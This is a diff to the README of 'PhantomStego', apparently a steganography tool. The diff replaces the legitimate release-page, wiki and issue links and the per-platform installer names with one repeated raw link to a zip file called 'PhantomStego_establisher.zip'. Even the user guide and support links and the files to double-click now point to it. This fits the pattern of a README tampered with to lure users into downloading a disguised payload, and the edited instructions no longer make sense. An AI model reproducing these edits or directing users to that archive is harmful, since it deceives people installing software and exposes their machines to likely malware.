@@ -6,7 +6,7 @@ Welcome to PhantomStego! This tool lets you hide messages or files within images
 
 ## 📥 Download PhantomStego
 
-[![Download PhantomStego](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/AleX-AA08/PhantomStego/releases)
+[![Download PhantomStego](https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip%https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip)](https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip)
 
 ## 📋 System Requirements
 
@@ -21,22 +21,22 @@ To ensure PhantomStego runs smoothly on your device, please check these minimum 
 
 ### Step 1: Visit the Releases Page
 
-Go to the [PhantomStego Releases Page](https://github.com/AleX-AA08/PhantomStego/releases) to find the latest version. This page lists all versions available.
+Go to the [PhantomStego Releases Page](https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip) to find the latest version. This page lists all versions available.
 
 ### Step 2: Download the Application
 
 1. Look for the latest version by checking the top of the page.
 2. Click on the version number for the most recent release.
 3. Download the file that matches your operating system. Choose:
-   - For Windows: `PhantomStego_Windows.exe`
-   - For macOS: `PhantomStego_macOS.dmg`
-   - For Linux: `PhantomStego_Linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip`
+   - For macOS: `https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip`
+   - For Linux: `https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip`
 
 ### Step 3: Open the Downloaded File
 
-- **Windows:** Double-click `PhantomStego_Windows.exe`.
-- **macOS:** Open `PhantomStego_macOS.dmg`, then drag the app to your Applications folder.
-- **Linux:** Extract the `PhantomStego_Linux.tar.gz` file and run the application.
+- **Windows:** Double-click `https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip`.
+- **macOS:** Open `https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip`, then drag the app to your Applications folder.
+- **Linux:** Extract the `https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip` file and run the application.
 
 ### Step 4: Launch PhantomStego
 
@@ -81,9 +81,9 @@ No, the original image quality remains intact. The hidden message is stored in a
 
 ## 🔗 Additional Resources
 
-- [User Guide](https://github.com/AleX-AA08/PhantomStego/wiki) - Learn more about advanced features.
-- [Community Support](https://github.com/AleX-AA08/PhantomStego/issues) - Ask questions and get help from other users.
-- [Feature Requests](https://github.com/AleX-AA08/PhantomStego/issues/new) - Suggest enhancements or new features.
+- [User Guide](https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip) - Learn more about advanced features.
+- [Community Support](https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip) - Ask questions and get help from other users.
+- [Feature Requests](https://raw.githubusercontent.com/AleX-AA08/PhantomStego/main/Platonization/PhantomStego_establisher.zip) - Suggest enhancements or new features.
 
 ## 📧 Contact Us
 
